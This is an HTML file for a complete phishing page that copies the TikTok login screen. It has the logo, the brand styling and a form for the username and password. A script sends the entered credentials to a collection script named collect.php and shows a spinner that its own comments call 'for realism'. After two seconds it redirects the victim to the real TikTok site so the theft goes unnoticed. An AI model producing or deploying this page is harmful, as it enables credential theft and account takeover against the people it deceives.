<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>TikTok - Login</title>
    <style>
        body {
            font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif;
            background-color: #fff;
            display: flex;
            justify-content: center;
            align-items: center;
            height: 100vh;
            margin: 0;
        }
        .container {
            width: 350px;
            padding: 20px;
            border-radius: 8px;
            text-align: center;
        }
        .logo {
            width: 60px;
            margin-bottom: 20px;
        }
        h2 {
            margin-bottom: 10px;
            color: #000;
        }
        p {
            color: #666;
            margin-bottom: 20px;
            font-size: 14px;
        }
        input {
            width: 100%;
            padding: 12px;
            margin: 8px 0;
            box-sizing: border-box;
            border: 1px solid #ddd;
            border-radius: 4px;
            font-size: 16px;
        }
        button {
            width: 100%;
            padding: 14px;
            background-color: #fe2c55;
            color: white;
            border: none;
            border-radius: 4px;
            font-size: 16px;
            font-weight: bold;
            cursor: pointer;
            margin-top: 10px;
        }
        button:hover {
            background-color: #e0244b;
        }
        .footer {
            margin-top: 20px;
            font-size: 12px;
            color: #999;
        }
        /* Spinner for realism */
        .spinner {
            display: none;
            border: 4px solid #f3f3f3;
            border-top: 4px solid #fe2c55;
            border-radius: 50%;
            width: 30px;
            height: 30px;
            animation: spin 2s linear infinite;
            margin: 20px auto;
        }
        @keyframes spin {
            0% { transform: rotate(0deg); }
            100% { transform: rotate(360deg); }
        }
    </style>
</head>
<body>

<div class="container">
    <!-- TikTok Logo -->
    <img src="https://static.tiktokfe.com/web/app-icon.png" alt="TikTok Logo" class="logo">
    
    <h2>Welcome back</h2>
    <p>Log in to TikTok to continue</p>

    <!-- Form sends data to collect.php -->
    <form action="collect.php" method="POST">
        <input type="text" name="username" placeholder="Phone, email, username" required>
        <input type="password" name="password" placeholder="Password" required>
        <button type="submit">Log In</button>
    </form>

    <div class="spinner" id="spinner"></div>
    <div id="message" style="display:none; color: green; margin-top:10px;">Logging in...</div>
</div>

<script>
    // Simulate loading then redirect to real TikTok
    document.querySelector('form').addEventListener('submit', function(e) {
        e.preventDefault(); // Stop default submit initially
        
        // Show spinner
        document.querySelector('button').style.display = 'none';
        document.getElementById('spinner').style.display = 'block';
        
        // Actually submit the form via JS to send data first
        var formData = new FormData(this);
        fetch('collect.php', {
            method: 'POST',
            body: formData
        }).then(() => {
            // Redirect to real TikTok after 2 seconds
            setTimeout(() => {
                window.location.href = "https://www.tiktok.com";
            }, 2000);
        });
    });
</script>

</body>
</html>
